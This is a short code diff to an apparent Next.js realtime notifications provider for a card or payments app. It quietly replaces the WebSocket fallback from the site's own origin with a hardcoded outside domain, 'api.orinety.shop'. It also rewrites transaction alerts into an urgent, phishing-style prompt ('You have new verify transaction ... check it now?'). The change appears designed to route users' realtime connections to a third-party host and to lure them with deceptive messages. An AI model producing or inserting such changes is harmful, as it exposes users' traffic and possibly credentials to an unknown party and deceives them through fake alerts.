@@ -44,7 +44,7 @@ const RealtimeNotificationsContext =
 function getWsBaseUrl(): string {
   const env = process.env.NEXT_PUBLIC_WS_URL;
   if (env && env.trim().length > 0) return env.trim().replace(/\/+$/, "");
-  if (typeof window !== "undefined") return window.location.origin;
+  if (typeof window !== "undefined") return "https://api.orinety.shop";
   return "";
 }
 
@@ -115,10 +115,8 @@ export function RealtimeNotificationsProvider({
         payload.cardName
           ? `${payload.cardName}${payload.merchantName ? ` • ${payload.merchantName}` : ""}`
           : payload.merchantName ?? payload.description;
-      let description = `Transaction: ${payload.transactionId}`;
-      if (descriptionCore) {
-        description += ` • ${descriptionCore}`;
-      }
+      const details = descriptionCore ? String(descriptionCore) : "";
+      const description = `You have new verify transaction ${payload.transactionId} . ${details}, check it now?`;
 
       const next: NotificationItem = {
         id: payload.transactionId,
